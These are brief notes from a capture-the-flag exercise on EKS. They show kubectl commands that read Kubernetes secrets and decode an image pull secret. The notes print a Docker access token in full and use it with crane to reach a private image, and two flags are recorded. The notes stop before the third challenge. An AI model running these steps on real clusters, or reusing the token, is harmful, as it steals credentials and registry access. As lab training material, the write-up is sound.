# WizEKS
https://eksclustergames.com/

**1. challenge:**
kubectl get secrets -o yaml

wiz_eks_challenges{omg_overprivileged_secrets}



**2. challenge:**
kubectl describe pod database-pod-2c9b3a4e

  Image: eksclustergames/base_ext_image

kubectl get pod database-pod-2c9b3a4e -o yaml

   imagePullSecrets:
   
      - name: registry-pull-secrets-780bab1d


kubectl get secret registry-pull-secrets-780bab1d -o jsonpath="{.data.\.dockerconfigjson}" | base64 --decode

  base64 decode
  
    - eksclustergames:dckr_pat_YtncV-R85mG7m4lr45iYQj8FuCo

crane auth login docker.io -u eksclustergames -p dckr_pat_YtncV-R85mG7m4lr45iYQj8FuCo


crane config eksclustergames/base_ext_image

wiz_eks_challenge{nothing_can_be_said_to_be_certain_except_death_taxes_and_the_exisitense_of_misconfigured_imagepullsecret}



**3. challenge**
